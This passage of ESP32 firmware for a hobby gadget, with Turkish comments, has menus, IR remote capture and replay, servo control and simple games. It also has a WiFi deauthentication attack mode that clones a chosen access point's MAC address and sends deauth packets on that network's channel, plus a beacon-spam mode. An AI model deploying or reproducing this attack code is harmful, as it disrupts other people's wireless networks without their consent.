            case 2: // Geri
                CURRENTSTATE = STATE_MAIN_MENU;
                break;
        }
    }
}

// Deauther Tarama Menüsü
void handle_wifi_deauth_scan_menu() {
    int n = WiFi.scanComplete();
    if (n >= 0) {
        ag_sayisi = n;
        for (int i = 0; i < min(n, 20); ++i) ssid_listesi[i] = WiFi.SSID(i);
        if (n == 0) WiFi.scanDelete();
        screen_needs_update = true;
    }
    if (is_button_pressed(button_down) && ag_sayisi > 0) {
        secili_network = (secili_network + 1) % ag_sayisi;
        if (secili_network >= kaydirma_offset + 4) kaydirma_offset = secili_network - 3;
    }
    if (is_button_pressed(button_up) && ag_sayisi > 0) {
        secili_network = (secili_network - 1 + ag_sayisi) % ag_sayisi;
        if (secili_network < kaydirma_offset) kaydirma_offset = secili_network;
    }
    if (is_button_pressed(button_left)) { // Geri
        WiFi.scanDelete(); WiFi.mode(WIFI_OFF);
        CURRENTSTATE = STATE_WIFI_TOOLS_MENU;
    }
    if (is_button_pressed(button_ok) && ag_sayisi > 0) {
        uint8_t* bssid_ptr = WiFi.BSSID(secili_network);
        memcpy(target_bssid, bssid_ptr, 6);
        target_channel = WiFi.channel(secili_network);

        // AP Moduna ve MAC Klonlamaya geç
        WiFi.disconnect();
        WiFi.mode(WIFI_OFF);
        delay(50);
        WiFi.mode(WIFI_MODE_AP);

        // MAC ADRESİNİ KLONLA (Sihirli Dokunuş)
        esp_wifi_set_mac(WIFI_IF_AP, target_bssid);

        WiFi.softAP("StarLog_Attack", "12345678", target_channel);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

        is_attacking = true;

        // Başlangıç hatalarını önlemek için bekle
        delay(500);

        CURRENTSTATE = STATE_WIFI_DEAUTH_ATTACK;
    }
}

// Saldırı Döngüsü
void handle_deauth_attack() {
    if (is_attacking) {
        send_deauth_packets();
    }
    if (is_button_pressed(button_left)) { // Geri
        is_attacking = false;
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_OFF);
        delay(50);
        WiFi.mode(WIFI_MODE_STA); // Taramaya hazır hale getir

        CURRENTSTATE = STATE_WIFI_DEAUTH_SCAN_MENU;
        tft.fillScreen(ui_bgcolor);
        scan_wifi_networks();
    }
}

// Beacon Spam Döngüsü
void handle_beacon_spam() {
    if (is_beacon_spamming) {
        send_beacon_spam();
    }
    if (is_button_pressed(button_left)) { // Geri
        is_beacon_spamming = false;
        WiFi.mode(WIFI_OFF);
        CURRENTSTATE = STATE_WIFI_TOOLS_MENU;
    }
}

// DİĞER HANDLE FONKSİYONLARI (IR, OYUNLAR VS.)
void handle_other_tools_menu() {
  if (is_button_pressed(button_left)) othertoolsmenu_selection = (othertoolsmenu_selection - 1 + othertoolsmenu_items_count) % othertoolsmenu_items_count;
  if (is_button_pressed(button_right)) othertoolsmenu_selection = (othertoolsmenu_selection + 1) % othertoolsmenu_items_count;
  if (is_button_pressed(button_ok)) {
    switch (othertoolsmenu_selection) {
      case 0: CURRENTSTATE = STATE_SERVO_CONTROL; break;
      case 1: CURRENTSTATE = STATE_POWER_OUTPUT; break;
      case 2: CURRENTSTATE = STATE_GAMES_MENU; break;
      case 3: CURRENTSTATE = STATE_MAIN_MENU; break;
    }
  }
}

void handle_games_menu() {
  if (is_button_pressed(button_left)) gamesmenu_selection = (gamesmenu_selection - 1 + gamesmenu_items_count) % gamesmenu_items_count;
  if (is_button_pressed(button_right)) gamesmenu_selection = (gamesmenu_selection + 1) % gamesmenu_items_count;
  if (is_button_pressed(button_ok)) {
    if (gamesmenu_selection == 3) { CURRENTSTATE = STATE_OTHER_TOOLS_MENU; }
    else {
      switch (gamesmenu_selection) {
        case 0: CURRENTSTATE = STATE_GAME_SNAKE; snakeScore=0; snakeLength=1; snakeDirection=3; snake[0]={SNAKE_START_X, SNAKE_START_Y}; randomSeed(millis()); food={random(1,(screen_width/SNAKE_BLOCK_SIZE)-1)*SNAKE_BLOCK_SIZE, random(1,(screen_height/SNAKE_BLOCK_SIZE)-1)*SNAKE_BLOCK_SIZE}; snakeGameOver=false; break;
        case 1: CURRENTSTATE = STATE_GAME_GUESS_NUMBER; randomSeed(millis()); hedefsayi=random(1,101); currentnumber=50; denemesayisi=0; draw_numbergamescreen("Yeni bir sayi tuttum!"); break;
        case 2: CURRENTSTATE = STATE_GAME_PONG; pongScore=0; paddleY=screen_height/2-PADDLE_HEIGHT/2; ballX=screen_width/2; ballY=screen_height/2; ballDirX=1; ballDirY=1; pongGameOver=false; break;
      }
    }
  }
}

void handle_snake_game() {
    static unsigned long lastMoveTime = 0;
    const unsigned long moveInterval = 200;
    if (snakeGameOver) { if (is_button_pressed(button_left) || is_button_pressed(button_ok)) CURRENTSTATE = STATE_GAMES_MENU; return; }
    if (is_button_pressed(button_up) && snakeDirection != 1) snakeDirection = 0;
    if (is_button_pressed(button_down) && snakeDirection != 0) snakeDirection = 1;
    if (is_button_pressed(button_left) && snakeDirection != 3) snakeDirection = 2;
    if (is_button_pressed(button_right) && snakeDirection != 2) snakeDirection = 3;
    if (millis() - lastMoveTime > moveInterval) {
        lastMoveTime = millis();
        for (int i = snakeLength - 1; i > 0; i--) snake[i] = snake[i - 1];
        switch (snakeDirection) { case 0: snake[0].y-=SNAKE_BLOCK_SIZE; break; case 1: snake[0].y+=SNAKE_BLOCK_SIZE; break; case 2: snake[0].x-=SNAKE_BLOCK_SIZE; break; case 3: snake[0].x+=SNAKE_BLOCK_SIZE; break; }
        if (snake[0].x < 0 || snake[0].x >= screen_width || snake[0].y < 30 || snake[0].y >= screen_height) snakeGameOver = true;
        for (int i = 1; i < snakeLength; i++) if (snake[0].x == snake[i].x && snake[0].y == snake[i].y) snakeGameOver = true;
        if (snake[0].x == food.x && snake[0].y == food.y) {
            snakeScore++; snakeLength++; if (snakeLength >= SNAKE_MAX_LENGTH) snakeGameOver = true;
            food = {random(1, (screen_width / SNAKE_BLOCK_SIZE) - 1) * SNAKE_BLOCK_SIZE, random(1, (screen_height / SNAKE_BLOCK_SIZE) - 1) * SNAKE_BLOCK_SIZE};
        } screen_needs_update = true;
    }
}

void handle_pong_game() {
    static unsigned long lastMoveTime = 0;
    const unsigned long moveInterval = 10;
    if (pongGameOver) { if (is_button_pressed(button_left) || is_button_pressed(button_ok)) CURRENTSTATE = STATE_GAMES_MENU; return; }
    if (is_button_pressed(button_up)) paddleY = max(paddleY - 5, 30);
    if (is_button_pressed(button_down)) paddleY = min(paddleY + 5, screen_height - PADDLE_HEIGHT);
    if (millis() - lastMoveTime > moveInterval) {
        lastMoveTime = millis();
        ballX += ballDirX; ballY += ballDirY;
        if (ballY <= 30 || ballY >= screen_height - BALL_SIZE) ballDirY *= -1;
        if (ballX <= 0) pongGameOver = true;
        if (ballX >= screen_width - BALL_SIZE) {
            pongScore++; ballX = screen_width / 2; ballY = random(30, screen_height);
            ballDirX *= -1; ballDirY = random(0, 2) * 2 - 1;
        }
        if (ballX <= 5 + PADDLE_WIDTH && ballY + BALL_SIZE >= paddleY && ballY <= paddleY + PADDLE_HEIGHT) ballDirX *= -1;
        screen_needs_update = true;
    }
}

void handle_number_game() {
    if (is_button_pressed(button_up)) { currentnumber = min(currentnumber + 1, 100); draw_numbergamescreen("Tahmininizi secin..."); }
    if (is_button_pressed(button_down)) { currentnumber = max(currentnumber - 1, 1); draw_numbergamescreen("Tahmininizi secin..."); }
    if (is_button_pressed(button_ok)) {
        denemesayisi++;
        if (currentnumber == hedefsayi) { draw_numbergamescreen("Dogru, kazandiniz!"); delay(2000); CURRENTSTATE = STATE_GAMES_MENU; }
        else if (currentnumber > hedefsayi) draw_numbergamescreen("Daha Kucuk!"); else draw_numbergamescreen("Daha Buyuk!");
    }
    if (is_button_pressed(button_left)) CURRENTSTATE = STATE_GAMES_MENU;
}

void handle_power_output() {
  if (is_button_pressed(button_ok)) set_power_output(!power_output_durumu);
  if (is_button_pressed(button_left)) CURRENTSTATE = STATE_OTHER_TOOLS_MENU;
}

void handle_servo_control() {
  if (is_button_pressed(button_up)) { if (servo_aci < max_servo) { servo_aci += 10; if (servo_aci > max_servo) servo_aci = max_servo; starlogservo.write(servo_aci); } }
  if (is_button_pressed(button_down)) { if (servo_aci > min_servo) { servo_aci -= 10; if (servo_aci < min_servo) servo_aci = min_servo; starlogservo.write(servo_aci); } }
  if (is_button_pressed(button_left)) CURRENTSTATE = STATE_OTHER_TOOLS_MENU;
}

void handle_ir_remote_menu() {
  if (is_button_pressed(button_left)) irmenu_selection = (irmenu_selection - 1 + irmenu_items_count) % irmenu_items_count;
  if (is_button_pressed(button_right)) irmenu_selection = (irmenu_selection + 1) % irmenu_items_count;
  if (is_button_pressed(button_ok)) {
    switch (irmenu_selection) {
      case 0: CURRENTSTATE = STATE_IR_REMOTE_SCAN; alinabilir_sinyal = false; IrReceiver.start(); draw_scan_screen(true); break;
      case 1: CURRENTSTATE = STATE_IR_REMOTE_SAVED_LIST; irlist_selection = 0; list_scroll_offset = 0; break;
      case 2: CURRENTSTATE = STATE_MAIN_MENU; break;
    }
  }
}

void handle_settings_menu() {
  if (is_button_pressed(button_left)) settingsmenu_selection = (settingsmenu_selection - 1 + settingsmenu_items_count) % settingsmenu_items_count;
  if (is_button_pressed(button_right)) settingsmenu_selection = (settingsmenu_selection + 1) % settingsmenu_items_count;
  if (is_button_pressed(button_ok)) {
    if (settingsmenu_selection == 3) CURRENTSTATE = STATE_MAIN_MENU;
    else { CURRENTSTATE = STATE_SETTINGS_COLOR_MENU; settingscolormenu_selection = 0; list_scroll_offset = 0; }
  }
}

void handle_color_settings_menu() {
  int maxvisibleitems = 5;
  if (is_button_pressed(button_down)) {
    settingscolormenu_selection = (settingscolormenu_selection + 1) % colors_num;
    if (settingscolormenu_selection >= list_scroll_offset + maxvisibleitems) list_scroll_offset++;
    if (settingscolormenu_selection == 0) list_scroll_offset = 0;
  }
  if (is_button_pressed(button_up)) {
    settingscolormenu_selection = (settingscolormenu_selection + colors_num - 1) % colors_num;
    if (settingscolormenu_selection < list_scroll_offset) list_scroll_offset--;
    if (settingscolormenu_selection == colors_num - 1) list_scroll_offset = max(0, (int)colors_num - maxvisibleitems);
  }
  if (is_button_pressed(button_left)) CURRENTSTATE = STATE_SETTINGS_MENU;
  if (is_button_pressed(button_ok)) {
    uint16_t selectedColor = colors[settingscolormenu_selection];
    switch (settingsmenu_selection) {
      case 0: ui_highlightcolor = selectedColor; break;
      case 1: ui_headertextcolor = selectedColor; break;
      case 2: dhttextcolor = selectedColor; break;
    }
    save_settings_to_eeprom(); CURRENTSTATE = STATE_SETTINGS_MENU;
  }
}

void handle_ir_scan() {
  if (!alinabilir_sinyal) {
    if (IrReceiver.decode()) {
      if (IrReceiver.decodedIRData.command != 0) {
        alinan_sinyal_komut = IrReceiver.decodedIRData.command;
        alinan_sinyal_adres = IrReceiver.decodedIRData.address;
        alinan_sinyal_protokol = IrReceiver.decodedIRData.protocol;
        alinan_sinyal_bit = IrReceiver.decodedIRData.numberOfBits;
        alinabilir_sinyal = true;
        draw_scan_screen(false);
      } IrReceiver.resume();
    }
  }
  if (alinabilir_sinyal && is_button_pressed(button_ok)) {
    if (kayitli_sinyal_sayisi < max_sinyal_sayisi) {
      sprintf(kayitli_sinyaller[kayitli_sinyal_sayisi].name, "Sinyal %d", kayitli_sinyal_sayisi + 1);
      kayitli_sinyaller[kayitli_sinyal_sayisi].command = alinan_sinyal_komut;
      kayitli_sinyaller[kayitli_sinyal_sayisi].address = alinan_sinyal_adres;
      kayitli_sinyaller[kayitli_sinyal_sayisi].protocol = alinan_sinyal_protokol;
      kayitli_sinyaller[kayitli_sinyal_sayisi].bit_number = alinan_sinyal_bit;
      kayitli_sinyaller[kayitli_sinyal_sayisi].isEmpty = false;
      kayitli_sinyal_sayisi++;
      save_settings_to_eeprom(); save_signals_to_eeprom();
      tft.fillScreen(ui_bgcolor); tft.setTextSize(1); tft.setTextColor(ST77XX_GREEN);
      tft.setCursor(10, 50); tft.print("Sinyal Kaydedildi"); delay(1500);
      CURRENTSTATE = STATE_IR_REMOTE_MENU;
    }
  }
  if (is_button_pressed(button_left)) { alinabilir_sinyal = false; CURRENTSTATE = STATE_IR_REMOTE_MENU; }
}

void handle_saved_list() {
  int maxvisibleitems = 4;
  if (kayitli_sinyal_sayisi > 0) {
    if (is_button_pressed(button_down)) {
        irlist_selection = (irlist_selection + 1) % kayitli_sinyal_sayisi;
        if (irlist_selection >= list_scroll_offset + maxvisibleitems) list_scroll_offset++;
        if (irlist_selection == 0) list_scroll_offset = 0;
    }
    if (is_button_pressed(button_up)) {
        irlist_selection = (irlist_selection + kayitli_sinyal_sayisi - 1) % kayitli_sinyal_sayisi;
        if (irlist_selection < list_scroll_offset) list_scroll_offset--;
        if (irlist_selection == kayitli_sinyal_sayisi -1) list_scroll_offset = max(0, kayitli_sinyal_sayisi - maxvisibleitems);
    }
    if (is_button_pressed(button_ok)) {
      switch(kayitli_sinyaller[irlist_selection].protocol) {
        case NEC: case NEC2: IrSender.sendNEC(kayitli_sinyaller[irlist_selection].address, kayitli_sinyaller[irlist_selection].command, 1); break;
        case SAMSUNG: IrSender.sendSamsung(kayitli_sinyaller[irlist_selection].address, kayitli_sinyaller[irlist_selection].command, 1); break;
        case RC5: IrSender.sendRC5(kayitli_sinyaller[irlist_selection].address, kayitli_sinyaller[irlist_selection].command, 1); break;
        case RC6: IrSender.sendRC6(kayitli_sinyaller[irlist_selection].address, kayitli_sinyaller[irlist_selection].command, 1); break;
        case SONY: IrSender.sendSony(kayitli_sinyaller[irlist_selection].address, kayitli_sinyaller[irlist_selection].command, 1, kayitli_sinyaller[irlist_selection].bit_number); break;
        default: IrSender.sendNEC(kayitli_sinyaller[irlist_selection].address, kayitli_sinyaller[irlist_selection].command, 1); break;
      }
      int displayIndex = irlist_selection - list_scroll_offset; int y = 35 + displayIndex * 22;
      tft.fillRect(5, y - 5, screen_width - 10, 20, ST77XX_ORANGE); tft.setTextColor(ui_bgcolor);
      tft.setCursor(40, y); tft.print("Gonderildi!"); delay(1000);
    }
    if (is_button_pressed(button_right)) {
      tft.fillScreen(ui_bgcolor); tft.setTextSize(1); tft.setTextColor(ST77XX_RED);
      tft.setCursor(10, 40); tft.print("Sinyal silinsin mi?");
      tft.setCursor(10, 60); tft.setTextColor(ui_textcolor); tft.print(kayitli_sinyaller[irlist_selection].name);
      tft.setCursor(10, 80); tft.setTextColor(ST77XX_YELLOW); tft.print("OK: Evet | Sol: Hayir");
      bool onaybekle = true;
      while (onaybekle) {
        if (is_button_pressed(button_ok)) {
          for (int i = irlist_selection; i < kayitli_sinyal_sayisi - 1; i++) kayitli_sinyaller[i] = kayitli_sinyaller[i + 1];
          kayitli_sinyal_sayisi--; save_settings_to_eeprom(); save_signals_to_eeprom();
          if (irlist_selection >= kayitli_sinyal_sayisi) irlist_selection = max(0, kayitli_sinyal_sayisi - 1);
          list_scroll_offset = max(0, irlist_selection - maxvisibleitems + 1); onaybekle = false; break;
        }
        if (is_button_pressed(button_left)) { onaybekle = false; break; } delay(50);
      }
    }
  }
  if (is_button_pressed(button_left)) CURRENTSTATE = STATE_IR_REMOTE_MENU;
}

// SETUP VE LOOP
void setup() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); // Brownout korumasını kapat
    WiFi.setTxPower(WIFI_POWER_11dBm); // Gücü yarı yarıya düşürür
  Serial.begin(115200); Serial.println("STAX TECH | StarLog Baslatiliyor...");
  EEPROM.begin(eeprom_memory); load_settings_from_eeprom(); load_signals_from_eeprom(); load_pre_tv_codes();
  pinMode(button_up, INPUT_PULLUP); pinMode(button_down, INPUT_PULLUP);
  pinMode(button_left, INPUT_PULLUP); pinMode(button_right, INPUT_PULLUP); pinMode(button_ok, INPUT_PULLUP);
  pinMode(power_output_pin, OUTPUT); digitalWrite(power_output_pin, LOW);
  tft.initR(INITR_BLACKTAB); tft.setRotation(1);
  acilisekrani(); dht.begin(); starlogservo.attach(servo_pin); starlogservo.write(servo_aci);
  IrReceiver.begin(ir_receiver, ENABLE_LED_FEEDBACK); IrSender.begin(ir_sender);
  read_dht_sensor(); screen_needs_update = true;
}

void loop() {
  read_dht_sensor();
  if (screen_needs_update) {
    switch (CURRENTSTATE) {
      case STATE_MAIN_MENU: draw_mainmenu(); break;
      case STATE_IR_REMOTE_MENU: draw_irremotemenu(); break;
      case STATE_OTHER_TOOLS_MENU: draw_othertoolsmenu(); break;
      case STATE_GAMES_MENU: draw_gamesmenu(); break;
      case STATE_GAME_SNAKE: draw_snakescreen(); break;
      case STATE_GAME_PONG: draw_pongscreen(); break;
      case STATE_SETTINGS_MENU: draw_settingsmenu(); break;
      case STATE_SETTINGS_COLOR_MENU: draw_settings_color_menu(settingsmenu_selection); break;
      case STATE_SERVO_CONTROL: draw_servo_control_screen(); break;
      case STATE_POWER_OUTPUT: draw_power_output_screen(); break;
      case STATE_IR_REMOTE_SAVED_LIST: draw_saved_list_screen(); break;
      case STATE_WIFI_TOOLS_MENU: draw_wifitoolsmenu(); break;
      case STATE_WIFI_DEAUTH_SCAN_MENU: draw_wifi_scan_menu(); break;
      case STATE_WIFI_DEAUTH_ATTACK: draw_deauth_attack_screen(); break;
      case STATE_WIFI_BEACON_SPAM: draw_beacon_spam_screen(); break;
    }
    screen_needs_update = false;
  }
  switch (CURRENTSTATE) {
    case STATE_MAIN_MENU: handle_main_menu(); break;
    case STATE_IR_REMOTE_MENU: handle_ir_remote_menu(); break;
    case STATE_IR_REMOTE_SCAN: handle_ir_scan(); break;
    case STATE_IR_REMOTE_SAVED_LIST: handle_saved_list(); break;
    case STATE_OTHER_TOOLS_MENU: handle_other_tools_menu(); break;
    case STATE_GAMES_MENU: handle_games_menu(); break;
    case STATE_GAME_SNAKE: handle_snake_game(); break;
    case STATE_GAME_PONG: handle_pong_game(); break;
    case STATE_GAME_GUESS_NUMBER: handle_number_game(); break;
    case STATE_SETTINGS_MENU: handle_settings_menu(); break;
    case STATE_SETTINGS_COLOR_MENU: handle_color_settings_menu(); break;
    case STATE_SERVO_CONTROL: handle_servo_control(); break;
    case STATE_POWER_OUTPUT: handle_power_output(); break;
    case STATE_WIFI_TOOLS_MENU: handle_wifi_tools_menu(); break;
    case STATE_WIFI_DEAUTH_SCAN_MENU: handle_wifi_deauth_scan_menu(); break;
    case STATE_WIFI_DEAUTH_ATTACK: handle_deauth_attack(); break;
    case STATE_WIFI_BEACON_SPAM: handle_beacon_spam(); break;
  }
}